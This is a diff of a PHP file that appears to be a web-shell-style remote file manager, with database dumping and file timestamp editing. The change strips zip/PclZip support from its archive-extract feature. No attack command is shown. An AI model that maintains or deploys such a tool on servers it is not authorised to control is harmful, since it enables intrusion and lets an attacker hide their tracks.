@@ -31,7 +31,6 @@ define('IS_COM', class_exists('COM') ? 1 : 0);
 define('IS_GPC', get_magic_quotes_gpc());
 $dis_func = get_cfg_var('disable_functions');
 define('IS_PHPINFO', (!eregi("phpinfo", $dis_func)) ? 1 : 0);
-define('SUPPORT_ZIP', file_exists(SA_ROOT . 'pclzip.lib.php') ? 1 : 0);
 @set_time_limit(0);
 
 foreach (array('_GET', '_POST') as $_request) {
@@ -565,8 +564,8 @@ if ($doing == 'mysqldown') {
 							// 检查是否是tar.gz文件
 							else {
 								$filename = basename($filepath);
-								if (!preg_match('/\.(tar\.gz|tgz|zip)$/i', $filename)) {
-									m('Please select a tar.gz or zip file');
+								if (!preg_match('/\.(tar\.gz|tgz)$/i', $filename)) {
+									m('Please select a tar.gz file');
 								} else {
 									// 直接解压到当前目录
 									if (extractfile($filepath, $nowpath)) {
@@ -663,7 +662,7 @@ if ($doing == 'mysqldown') {
 
 						function extractfile(compressedfile) {
 							if (!compressedfile) {
-								alert('Please select a compressed file (.tar.gz, .tgz or .zip) to extract.');
+								alert('Please select a compressed file (.tar.gz or .tgz) to extract.');
 								return;
 							}
 							if (confirm('Are you sure will extract ' + compressedfile + ' to current directory?')) {
@@ -826,7 +825,7 @@ if ($doing == 'mysqldown') {
 							p('<a href="javascript:opfile(\'editfile\',\'' . $filedb['server_link'] . '\',\'' . $filedb['dirlink'] . '\');">Edit</a> | ');
 							p('<a href="javascript:rename(\'' . $filedb['server_link'] . '\');">Rename</a> | ');
 							p('<a href="javascript:opfile(\'newtime\',\'' . $filedb['server_link'] . '\',\'' . $filedb['dirlink'] . '\');">Time</a>');
-							if (str_ends_with($filedb['filename'], '.gz') || str_ends_with($filedb['filename'], '.tgz') || (str_ends_with($filedb['filename'], '.zip') && SUPPORT_ZIP)) {
+							if (str_ends_with($filedb['filename'], '.gz') || str_ends_with($filedb['filename'], '.tgz')) {
 								p(' | ');
 								p('<a href="javascript:dofile(\'extractfile\',\'' . $filedb['server_link'] . '\',\'Are you sure will extract ' . $filedb['filename'] . ' to current directory?\')">Extract</a>');
 							}
@@ -2518,7 +2517,7 @@ function extractfile($file, $extractPath)
 		}
 	}
 
-	if (preg_match('/\.(tar\.gz|tgz|zip)$/i', $file)) {
+	if (preg_match('/\.(tar\.gz|tgz)$/i', $file)) {
 		return realextract($file, $extractPath);
 	} else {
 		return false; // 不支持的格式
@@ -2528,22 +2527,9 @@ function extractfile($file, $extractPath)
 // 解压tar.gz文件函数
 function realextract($file, $extractPath)
 {
-
 	// 检查是否有zlib扩展支持
 	if (!function_exists('gzopen')) {
 		return false;
-	}
-
-
-	// 尝试使用PclZip如果可用（更好的错误处理）
-	if (SUPPORT_ZIP) {
-		require_once('pclzip.lib.php');
-		$archive = new PclZip($file);
-		if ($archive->extract(PCLZIP_OPT_PATH, $extractPath)) {
-			return true;
-		}
-	} else if (str_ends_with(strtolower($file), '.zip')) {
-		return false; // PclZip不可用，无法处理zip文件
 	}
 
 	// 打开tar.gz文件
